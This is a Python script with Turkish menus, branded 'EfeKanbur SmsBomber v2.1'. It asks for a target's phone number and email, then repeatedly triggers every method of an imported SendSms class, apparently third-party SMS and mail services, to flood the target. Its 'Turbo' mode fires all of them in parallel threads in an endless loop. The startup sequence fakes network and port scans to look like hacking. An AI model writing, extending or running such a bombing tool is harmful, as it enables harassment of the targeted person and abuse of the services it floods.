from colorama import Fore, Style, init
from time import sleep
from os import system
from sms import SendSms
import threading
import random
import time
import sys

init(autoreset=True)

# =====================
# TEMEL FONKSİYONLAR
# =====================

def clear():
    system("cls||clear")

def beep():
    print("\a", end="")  # terminal bip

def hacker_print(text, delay=0.02):
    for char in text:
        print(char, end="", flush=True)
        sleep(delay)
    print()

def log(text):
    print(Fore.LIGHTBLACK_EX + f"[{time.strftime('%H:%M:%S')}] ", end="")
    hacker_print(Fore.LIGHTWHITE_EX + text, 0.01)

def spinner(text, duration=2):
    spinner_chars = "|/-\\"
    print(Fore.CYAN + text + " ", end="", flush=True)
    end_time = time.time() + duration

    i = 0
    while time.time() < end_time:
        print(spinner_chars[i % 4], end="\r", flush=True)
        sleep(0.1)
        i += 1
    print("✔")

def loading_bar(text):
    print(Fore.LIGHTCYAN_EX + text + " ", end="")
    for i in range(20):
        print("█", end="", flush=True)
        sleep(0.03)
    print(" ✔")

def fake_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# =====================
# SMS SERVİSLERİ
# =====================

servisler_sms = []
for attribute in dir(SendSms):
    attr = getattr(SendSms, attribute)
    if callable(attr) and not attribute.startswith('__'):
        servisler_sms.append(attribute)

# =====================
# BANNER
# =====================

def banner():
    print(Fore.RED + """


██████╗ ███████╗██╗  ████████╗ █████╗ 
██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗
██║  ██║█████╗  ██║     ██║   ███████║
██║  ██║██╔══╝  ██║     ██║   ██╔══██║
██████╔╝███████╗███████╗██║   ██║  ██║
╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝






EfeKanbur SmsBomber 
SmsBomber - v2.1

InstaGram : efeva


""" + Style.RESET_ALL)

# =====================
# SİSTEM BAŞLAT
# =====================

def system_run():
    clear()
    banner()

    beep()
    log(" Terminal başlatılıyor...")
    spinner(" Core init", 2)

    log(" Ağ taranıyor...")
    spinner(" Network scan", 2)

    for _ in range(3):
        log(f" Aktif IP bulundu → {fake_ip()}")
        sleep(0.3)

    spinner(" Port taraması", 2)

    for p in [22, 80, 443]:
        log(f" Port {p} açık")

    log(" Dil: TR")
    loading_bar(" Sistem yükleniyor")

    log(" Yetki kontrolü yapılıyor")
    sleep(1)

    log(" Kullanıcı: Free User")
    log(" Yetki: SMS Engine")

    loading_bar(" Yetkiler yükleniyor")

    log(" Erişim verildi ✔")
    beep()

    sleep(1)
    clear()

    hacker_print(Fore.GREEN + "\n~ 𝙎𝙞𝙨𝙩𝙚𝙢 𝙃𝙖𝙯ı𝙧 𝙃𝙤𝙨̧𝙜𝙚𝙡𝙙𝙞𝙣𝙞𝙯 ~\n", 0.03)

	# =====================
	# ANA MENÜ
	# =====================

def main_menu():
    while True:
        clear()

        print(Fore.RED + """
██████╗ ███████╗██╗  ████████╗ █████╗ 
██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗
██║  ██║█████╗  ██║     ██║   ███████║
██║  ██║██╔══╝  ██║     ██║   ██╔══██║
██████╔╝███████╗███████╗██║   ██║  ██║
╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝

                Tool
       
       Developed By @EfeKanbur

""")

        print(Fore.LIGHTCYAN_EX + """ 
1 - Sistemi Başlat
2 - Çıkış 
""")
	



        secim = input(Fore.WHITE + "Seçim: ")

        if secim == "1":
            sms_menu()
        elif secim == "2":
            print("Çıkılıyor...")
            break
        else:
            print("Hatalı seçim!")
            sleep(1)

# =====================
# SMS MENÜ
# =====================

def sms_menu():
    system_run()

    while True:
        try:
            menu = int(input(
                Fore.WHITE +
                "\n 1- SMS Gönder [Normal]\n"
                " 2- SMS Gönder [Turbo]\n"
                " 3- Ana Menü\n\nSeçim: "
            ))
        except:
            print("Hatalı giriş!")
            sleep(1)
            continue

        if menu == 1:
            normal_sms()
        elif menu == 2:
            turbo_sms()
        elif menu == 3:
            break

# =====================
# NORMAL SMS
# =====================

def normal_sms():
    clear()
    print("Telefon numarası (10 haneli): ", end="")
    tel_no = input()

    if not (tel_no.isdigit() and len(tel_no) == 10):
        print("Hatalı numara!")
        sleep(2)
        return

    print("Mail: ", end="")
    mail = input()

    sms = SendSms(tel_no, mail)

    print(Fore.GREEN + "Gönderim başlıyor...\n")

    for _ in range(3):
        for fonk in servisler_sms:
            log(f"Gönderiliyor → {fonk}")
            getattr(sms, fonk)()
            sleep(0.5)

    input("\nDevam etmek için Enter...")

# =====================
# TURBO SMS
# =====================

def turbo_sms():
    clear()
    print("+90 Ve Boşluk olmadan telefon numarasını yazınız: ", end="")
    tel_no = input()

    print("Mail bomber için mail giriniz - istemiyorsanız enter basınız: ", end="")
    mail = input()

    send_sms = SendSms(tel_no, mail)
    dur = threading.Event()

    def Turbo():
        while not dur.is_set():
            threads = []
            for fonk in servisler_sms:
                t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

    try:
        log("Turbo mod başlatıldı (CTRL+C ile durdur)")
        Turbo()
    except KeyboardInterrupt:
        dur.set()
        print("\nDurduruldu")
        sleep(2)

# =====================
# BAŞLAT
# =====================

if __name__ == "__main__":
    main_menu()
